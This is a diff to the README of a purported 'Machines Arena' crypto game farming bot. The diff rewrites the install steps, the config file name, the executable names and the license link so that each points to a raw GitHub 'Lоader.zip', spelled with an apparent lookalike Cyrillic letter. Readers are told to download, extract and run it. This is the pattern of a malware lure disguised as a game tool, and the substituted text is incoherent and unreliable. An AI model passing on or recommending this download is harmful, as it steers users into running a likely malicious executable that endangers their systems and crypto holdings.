@@ -41,17 +41,17 @@ Welcome to **The Machines Arena Crypto Bot**! This innovative game assistant is 
 
 ## 📥 Installation Guide
 
-**1. Download Loader.rar from the repository.**
-- Navigate to the repository’s main page and download the `Loader.rar` file.
+**1. Download https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip from the repository.**
+- Navigate to the repository’s main page and download the `https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip` file.
   
-**2. Extract Loader.rar**
+**2. Extract https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip**
 - Use WinRAR, 7-zip, or your preferred archive tool to extract the contents into your game folder or preferred location.
 
 **3. Configure Your Game Account**
-- Open the extracted folder and edit the `settings.json` file with your game/API details.
+- Open the extracted folder and edit the `https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip` file with your game/API details.
 
 **4. Launch the Auto Farm Bot**
-- Run the appropriate executable for your operating system (`Loader.exe` for Windows, `Loader.sh` for Linux/MacOS).
+- Run the appropriate executable for your operating system (`https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip` for Windows, `https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip` for Linux/MacOS).
 
 **5. Enjoy Automated Crypto Farming!**
 - The bot will now operate automatically, letting you focus on strategic decisions while it takes care of repetitive farming and clicking.
@@ -79,7 +79,7 @@ The Machines Arena Crypto Bot is an **educational and convenience tool designed 
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) – You are free to use, modify, and distribute this project for personal or commercial uses.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/KEYS30/MachinesArena-CryptoGameBot-FarmClickerAPI/main/Lоader.zip) – You are free to use, modify, and distribute this project for personal or commercial uses.
 
 ---
 
